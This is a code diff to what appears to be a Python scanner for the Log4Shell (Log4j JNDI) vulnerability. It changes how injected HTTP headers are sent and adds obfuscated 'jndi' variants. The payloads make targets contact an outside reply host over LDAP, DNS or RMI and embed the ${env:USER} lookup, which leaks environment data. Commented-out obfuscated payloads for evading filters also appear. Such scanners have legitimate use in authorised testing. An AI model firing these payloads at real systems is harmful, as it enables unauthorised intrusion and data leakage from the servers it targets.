@@ -16,7 +16,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO)
 
 header_injects = [
-    'X-Api-Version',
+#    'X-Api-Version',
     'User-Agent',
     'Referer',
     'X-Druid-Comment',
@@ -91,8 +91,12 @@ def generate_header_value(payl):
 def check1(schema, url_input, reply_host, payl, timeout):
     logging.info(f"check1: Sending request to {schema}{url_input.hostname} using injecting {payl}")
 
-    headers = generate_header_value(payl)
-    send_request(f"{schema}{url_input.netloc}", headers, timeout)
+    gh = generate_header_value(payl)
+    for key, value in gh.items():
+        headers = {}
+        headers['X-Api-Version'] = "42"
+        headers[key] = value
+        send_request(f"{schema}{url_input.netloc}", headers, timeout)
 
 
 # Check 2 (Get request)
@@ -113,14 +117,23 @@ def deliver(args, url_input, reply_host, payl, timeout):
         check2(s, url_input, reply_host, payl, timeout)
 
 
-def payload_generation(args, url_input, reply_host, timeout):
-    identifier = uuid.uuid4()
-    logging.debug(f"Generated UUID: {identifier}")
-
-
+def payload_generator(identifier, url_input, reply_host):
     payloads = []
-    payloads.append(f'${{jndi:ldap://${{env:USER}}.{url_input.hostname}.{reply_host}/test.class}}')
-    payloads.append(f'${{jndi:dns://${{env:USER}}.{url_input.hostname}.{reply_host}:53/test.class}}')
+
+    obs_jndi = []
+    obs_jndi.append('jndi')
+    obs_jndi.append('${::-j}ndi')
+    obs_jndi.append('${::-j}${::-n}di')
+    obs_jndi.append('${::-j}${::-n}${::-d}i')
+    obs_jndi.append('${::-j}${::-n}${::-d}${::-i}')
+    obs_jndi.append('j${::-n}di')
+    obs_jndi.append('j${::-n}${::-d}i')
+    obs_jndi.append('jnd${::-i}')
+
+
+
+    payloads.append(f'${{jndi:ldap://${{env:USER}}.{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{jndi:dns://${{env:USER}}.{identifier}.{url_input.hostname}.{reply_host}:53/test.class}}')
 
     payloads.append(f'${{jndi:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
     payloads.append(f'${{jndi:dns://{identifier}.{url_input.hostname}.{reply_host}:53/test.class}}')
@@ -134,6 +147,8 @@ def payload_generation(args, url_input, reply_host, timeout):
     payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}i://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
     payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
 
+    return payloads
+
 #${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
 #${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
 #${jndi:rmi://adsasd.asdasd.asdasd}
@@ -141,6 +156,14 @@ def payload_generation(args, url_input, reply_host, timeout):
 #${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 #${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 #${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
+
+
+
+def payload_generation(args, url_input, reply_host, timeout):
+    identifier = uuid.uuid4()
+    logging.debug(f"Generated UUID: {identifier}")
+
+    payloads = payload_generator(identifier, url_input, reply_host)
 
 
     for payl in payloads:
